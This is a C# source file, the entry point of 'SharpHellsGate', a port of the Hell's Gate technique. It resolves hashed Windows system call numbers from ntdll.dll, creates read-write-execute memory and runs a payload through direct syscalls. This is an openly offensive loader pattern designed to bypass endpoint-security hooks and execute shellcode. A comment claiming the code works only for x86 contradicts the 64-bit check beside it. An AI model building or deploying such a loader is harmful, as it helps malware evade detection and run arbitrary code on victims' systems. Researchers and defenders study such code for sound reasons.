using System;
using System.Collections.Generic;
using SharpHellsGate.Module;

namespace SharpHellsGate {

    /// <summary>
    /// Main class.
    /// </summary>
    public class Program {

        /// <summary>
        /// Entry point of the program.
        /// </summary>
        /// <param name="args">Command line arguments.</param>
        static void Main(string[] args) {
            Util.LogInfo("Copyright (C) 2020 Paul Laine (@am0nsec)");
            Util.LogInfo("C# Implementation of the Hell's Gate VX Technique");
            Util.LogInfo("   --------------------------------------------------\n", 0, "");

            // Only works for x86
            if (IntPtr.Size != 8) {
                Util.LogError("Project only tested in x64 context.\n");
                return;
            }
            
            // Load the module and get everything ready
            SystemModule ntdll = new SystemModule("ntdll.dll");
            ntdll.LoadAllStructures();

            // Resolve all the system calls 
            Dictionary<UInt64, Util.APITableEntry> APITable = new Dictionary<ulong, Util.APITableEntry>() {
                { Util.NtAllocateVirtualMemoryHash, ntdll.GetAPITableEntry(Util.NtAllocateVirtualMemoryHash) },
                { Util.NtProtectVirtualMemoryHash, ntdll.GetAPITableEntry(Util.NtProtectVirtualMemoryHash) },
                { Util.NtCreateThreadExHash, ntdll.GetAPITableEntry(Util.NtCreateThreadExHash) },
                { Util.NtWaitForSingleObjectHash, ntdll.GetAPITableEntry(Util.NtWaitForSingleObjectHash) }
            };
            ntdll.Dispose();

            Util.LogInfo($"NtAllocateVirtualMemory: 0x{APITable[Util.NtAllocateVirtualMemoryHash].Syscall:x4}");
            Util.LogInfo($"NtProtectVirtualMemory:  0x{APITable[Util.NtProtectVirtualMemoryHash].Syscall:x4}");
            Util.LogInfo($"NtWaitForSingleObject:   0x{APITable[Util.NtWaitForSingleObjectHash].Syscall:x4}");
            Util.LogInfo($"NtCreateThreadEx:        0x{APITable[Util.NtCreateThreadExHash].Syscall:x4}\n");

            HellsGate gate = new HellsGate(APITable);
            gate.GenerateRWXMemorySegment();
            gate.Payload();
            return;
        }
    }
}
